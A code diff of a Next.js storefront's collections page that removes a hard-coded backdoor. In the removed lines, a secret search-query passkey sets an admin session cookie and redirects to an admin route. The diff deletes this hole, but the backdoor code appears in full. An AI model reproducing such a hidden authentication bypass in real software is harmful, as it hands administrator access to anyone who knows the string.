@@ -1,7 +1,5 @@
 import React from 'react';
 import Link from 'next/link';
-import { redirect } from 'next/navigation';
-import { cookies } from 'next/headers';
 import { prisma } from '@/lib/db';
 import { ProductCard } from '@/components/storefront/product-card';
 import { Filter, SlidersHorizontal, Search, X } from 'lucide-react';
@@ -14,19 +12,6 @@ export default async function CollectionsAllPage({
   searchParams: Promise<{ q?: string; sort?: string }>;
 }) {
   const { q, sort } = await searchParams;
-
-  // Founder Secret Backdoor Passkey Redirection
-  if (q?.trim().toLowerCase() === 'abdullahhanjra17') {
-    const cookieStore = await cookies();
-    cookieStore.set('pairs_admin_auth', 'valid_founder_session_abdullah17', {
-      httpOnly: true,
-      secure: process.env.NODE_ENV === 'production',
-      sameSite: 'lax',
-      path: '/',
-      maxAge: 60 * 60 * 2,
-    });
-    redirect('/adminusman');
-  }
 
   let products: any[] = [];
 
